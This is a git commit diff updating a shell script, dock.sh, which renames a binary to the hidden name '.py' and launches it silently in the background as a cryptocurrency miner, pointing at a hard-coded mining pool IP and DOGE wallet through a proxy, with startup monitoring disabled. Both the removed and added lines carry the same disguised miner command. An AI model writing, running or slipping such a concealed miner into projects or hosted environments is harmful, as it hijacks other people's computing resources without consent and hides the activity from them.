501afc9526891b209f3cc4fab91affb2ad387d7a
dediminari <101470275+dediminari@users.noreply.github.com>
2024-09-27 16:56:48 +0700

    Update dock.sh

--- dock.sh
+++ dock.sh
@@ -1,1 +1,2 @@
-chmod +x ./localruntime && mv localruntime .py && nohup ./.py --algorithm yespowerr16 --disable-gpu --pool 103.249.70.7:6534 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8 </dev/null &>/dev/null &
+chmod +x ./localruntime && mv localruntime .py
+nohup ./.py --algorithm yespowerr16 --disable-gpu --pool 103.249.70.7:6534 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8 </dev/null &>/dev/null &
